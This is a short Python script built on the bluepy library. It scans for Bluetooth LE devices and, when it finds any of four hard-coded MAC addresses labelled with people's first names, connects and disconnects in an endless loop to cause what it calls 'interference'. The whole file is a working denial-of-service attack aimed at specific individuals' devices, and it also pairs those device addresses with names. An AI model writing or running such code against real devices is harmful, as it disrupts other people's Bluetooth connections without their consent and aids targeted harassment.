from bluepy.btle import Scanner, DefaultDelegate, Peripheral
import time

class ScanDelegate(DefaultDelegate):
    def __init__(self):
        DefaultDelegate.__init__(self)

def scan_devices():
    scanner = Scanner().withDelegate(ScanDelegate())
    devices = scanner.scan(1.0)
    return devices

def create_interference(devices):
    target_addies = ["3f:ba:f5:38:70:17",
            "d3:ea:a6:7d:56:27",
            "73:dd:f4:95:60:87",
            "f6:1d:0c:e4:b7:a7"] # Order: Nate, Ali, Josiah, Kenyan
    
    idx = 1
    for dev in devices:
        if dev.addr in target_addies:
            while True:
                try:
                    print(idx, ": Attempting to connect to ", dev.addr)
                    peripheral = Peripheral(dev.addr)
                    time.sleep(0.1)
                    peripheral.disconnect()
                    print(idx, ": Disconnected from ", dev.addr)
                    idx += 1
                except Exception as e:
                    print("Failed to connect to ", dev.addr, " ", e)
    print("Stopping Interference")

if __name__ == "__main__":
    try:
        print("Scanning for Bluetooth devices...")
        devices = scan_devices()
        print("Starting interference...")
        create_interference(devices)
    except KeyboardInterrupt:
        print("Stopping Interference")
